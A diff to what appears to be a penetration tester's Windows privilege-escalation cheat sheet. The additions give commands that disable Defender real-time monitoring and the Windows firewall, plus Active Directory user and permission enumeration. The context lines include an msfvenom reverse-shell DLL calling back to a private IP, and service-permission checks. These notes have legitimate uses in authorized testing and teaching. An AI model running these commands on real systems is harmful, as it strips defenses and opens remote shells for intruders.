@@ -308,8 +308,14 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 * icacls  #check permission on currentdirectory
 * sc start <service>
 
-[turn off windows AV]
+[disable windows AV]
 powershell Set-MpPreference -DisableRealtimeMonitoring $true
+
+[disable windows firewall]
+# cmd
+netsh advfirewall set allprofiles state off
+# powershell
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 [dll hijacking]
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.68.111 LPORT=53 -f dll -o plugin.dll
@@ -637,3 +643,8 @@ accesschk.exe /accepteula -ucqv user
 # check writable path
 accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
 
+[AD Module]
+# GET ad user
+Get-ADUser -Identity asalam
+# Get users right 
+(get-acl "AD:\CN=Ahmad Salam,CN=Users,DC=CH4RM,DC=local").access | select identityreference,activedirectoryrights
